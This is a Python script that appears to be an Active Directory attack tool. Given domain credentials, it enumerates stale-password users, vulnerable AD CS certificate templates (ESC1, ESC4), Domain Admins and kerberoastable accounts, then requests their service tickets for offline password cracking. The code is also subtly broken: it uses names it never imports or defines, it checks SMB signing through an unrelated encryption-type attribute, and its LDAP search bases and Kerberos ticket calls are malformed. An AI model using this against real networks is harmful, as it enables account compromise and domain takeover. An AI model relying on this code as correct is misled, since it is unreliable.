import ldap3
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGS
import requests
import sys

def check_weak_passwords(username, password, domain):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(&(objectClass=user)(pwdLastSet<=12960000000000000))',  # Password last set more than 150 days ago
                    search_scope=ldap3.SUBTREE,
                    attributes=['sAMAccountName'])

        if conn.entries:
            print("Users with Weak Passwords:")
            for entry in conn.entries:
                print(entry.sAMAccountName.value)
        else:
            print("No users with weak passwords found.")

    except Exception as e:
        print(f"Error while checking weak passwords: {e}")

def check_for_persistence(username, password, domain):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return

        conn.search(search_base='CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(objectClass=serviceConnectionPoint)',
                    search_scope=ldap3.SUBTREE,
                    attributes=['serviceBindingInformation'])

        if conn.entries:
            print("Services with Persistence:")
            for entry in conn.entries:
                print(entry.serviceBindingInformation.value)
        else:
            print("No services with persistence found.")

    except Exception as e:
        print(f"Error while checking for persistence: {e}")

def check_ad_cs_certificate_templates(username, password, domain):
    # Connect to Active Directory
    server = Server(domain, get_info=ALL_ATTRIBUTES)
    conn = Connection(server, user=username, password=password)
    if not conn.bind():
        print("Failed to authenticate with provided credentials.")
        return
    
    # Search for Certificate Templates meeting specified criteria
    conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                search_filter='(&(objectClass=pKICertificateTemplate)(!(pKIEnrollmentFlag:1.2.840.113556.1.4.803:=1))(pKIEnrollmentFlag:1.2.840.113556.1.4.803:=128))',
                search_scope=SUBTREE,
                attributes=['displayName'])
    
    if conn.entries:
        print("AD CS Certificate Templates meeting the specified criteria (ESC1):")
        for entry in conn.entries:
            print(entry.displayName.value)
    else:
        print("No AD CS Certificate Templates meeting the specified criteria found (ESC1).")

        
def check_ad_cs_certificate_templates_acl(username, password, domain):
    server = ldap3.Server(domain, get_info=ldap3.ALL)
    conn = ldap3.Connection(server, user=username, password=password)
    if not conn.bind():
        print("Failed to authenticate with provided credentials.")
        return

    # Search for certificate templates
    conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                search_filter='(objectClass=pKICertificateTemplate)',
                search_scope=ldap3.SUBTREE,
                attributes=['cn'])

    templates_with_write_access = []
    for entry in conn.entries:
        template_name = entry.cn.value
        # Check if the user has permissions to modify this template
        if user_has_write_access(conn, template_name, username):
            templates_with_write_access.append(template_name)

    if templates_with_write_access:
        print(f"AD CS Certificate Templates where user '{username}' has write access (ESC4):")
        for template in templates_with_write_access:
            print(template)
    else:
        print(f"No AD CS Certificate Templates found where user '{username}' has write access (ESC4).")

def user_has_write_access(conn, template_name, username):
    # Query Active Directory to determine if the user has write access to the template
    # You may need to adjust this function based on your Active Directory structure and permissions
    # This is a simplified example assuming the user has write access if they are a member of a specific group
    conn.search(search_base='CN=' + template_name + ',CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                search_filter=f'(&(objectClass=pKICertificateTemplate)(member={username}))',
                search_scope=ldap3.BASE,
                attributes=['member'])

    return len(conn.entries) > 0

def check_webdav_enabled(domain):
    try:
        url = f"https://{domain}/webdav"
        response = requests.request("OPTIONS", url, timeout=5)
        
        if response.status_code == 200 and 'DAV' in response.headers.get('Allow', ''):
            print("WebDAV is enabled.")
        else:
            print("WebDAV is disabled.")

    except Exception as e:
        print(f"Error while checking WebDAV: {e}")

def get_domain_controllers(domain, username, password):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return []

        conn.search(search_base='CN=Computers,DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(objectClass=computer)',
                    search_scope=ldap3.SUBTREE,
                    attributes=['dNSHostName', 'msDS-SupportedEncryptionTypes'])

        domain_controllers = []
        for entry in conn.entries:
            dc_info = {
                'hostname': entry.dNSHostName.value,
                'encryption_types': entry['msDS-SupportedEncryptionTypes'].values if 'msDS-SupportedEncryptionTypes' in entry else []
            }
            domain_controllers.append(dc_info)

        return domain_controllers

    except Exception as e:
        print(f"Error while getting Domain Controllers: {e}")
        return []

def check_smb_signing_not_required_ldap(domain, username, password):
    try:
        domain_controllers = get_domain_controllers(domain, username, password)
        if not domain_controllers:
            print("No Domain Controllers found.")
            return

        for dc in domain_controllers:
            if 1 in dc['encryption_types']:
                print(f"Domain Controller {dc['hostname']}: SMB Signing not required.")
            else:
                print(f"Domain Controller {dc['hostname']}: SMB Signing required.")

    except Exception as e:
        print(f"Error while checking SMB Signing: {e}")

def get_user_permissions(username, password, domain):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return []

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter=f'(&(objectClass=user)(sAMAccountName={username}))',
                    search_scope=ldap3.SUBTREE,
                    attributes=['memberOf'])

        if conn.entries:
            user_groups = [str(group) for group in conn.entries[0]['memberOf'].values]
            print(f"User {username} is a member of the following groups:")
            for group in user_groups:
                print(group)
            return user_groups
        else:
            print(f"User {username} not found.")
            return []

    except Exception as e:
        print(f"Error while getting user permissions: {e}")
        return []

def get_domain_admins(domain, username, password):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return []

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')) + '))',
                    search_scope=ldap3.SUBTREE,
                    attributes=['sAMAccountName'])

        if conn.entries:
            domain_admins = [entry.sAMAccountName.value for entry in conn.entries]
            print("Domain Admins:")
            for admin in domain_admins:
                print(admin)
            return domain_admins
        else:
            print("No Domain Admins found.")
            return []

    except Exception as e:
        print(f"Error while getting Domain Admins: {e}")
        return []

def get_kerberoastable_accounts(domain, username, password):
    try:
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, user=username, password=password)
        if not conn.bind():
            print("Failed to authenticate with provided credentials.")
            return []

        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(&(objectClass=user)(servicePrincipalName=*)(!adminCount=1))',
                    search_scope=ldap3.SUBTREE,
                    attributes=['sAMAccountName'])

        if conn.entries:
            kerberoastable_accounts = [entry.sAMAccountName.value for entry in conn.entries]
            print("Kerberoastable Accounts:")
            for account in kerberoastable_accounts:
                print(account)
            return kerberoastable_accounts
        else:
            print("No kerberoastable accounts found.")

    except Exception as e:
        print(f"Error while getting kerberoastable accounts: {e}")
        return []

def kerberoast(domain, username, password, kerberoastable_accounts):
    try:
        for account in kerberoastable_accounts:
            print(f"Attempting to Kerberoast account: {account}")

            # Request a service ticket (TGS) for the kerberoastable account
            tgs, enc_part = getKerberosTGS(username, password, domain, account)

            # Extract the encrypted ticket from the TGS response
            ccache = CCache()
            ccache.fromTGS(tgs)
            ticket = ccache.credentials[0].ticket

            # Perform offline brute-force attacks to crack the passwords
            # Here you can implement your cracking logic, such as using dictionary attacks or hash cracking tools

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python script.py <username> <password> <domain>")
        sys.exit(1)

    username = sys.argv[1]
    password = sys.argv[2]
    domain = sys.argv[3]

    # Check for weak passwords
    check_weak_passwords(username, password, domain)

    # Check for persistence
    check_for_persistence(username, password, domain)

    # Check for AD CS certificate templates where the user has write access
    check_ad_cs_certificate_templates(username, password, domain)

    #esc4
    check_ad_cs_certificate_templates_acl(username, password, domain)

    # Check for machines with WebDAV enabled
    check_webdav_enabled(domain)

    # Check for computers with SMB Signing not required using LDAP
    check_smb_signing_not_required_ldap(domain, username, password)

    # Get current user's permissions
    get_user_permissions(username, password, domain)

    # Get Domain Admins
    get_domain_admins(domain, username, password)

    # Retrieve kerberoastable accounts
    kerberoastable_accounts = get_kerberoastable_accounts(domain, username, password)

    # Execute the Kerberoasting attack
    kerberoast(domain, username, password, kerberoastable_accounts)

if __name__ == "__main__":
    main()
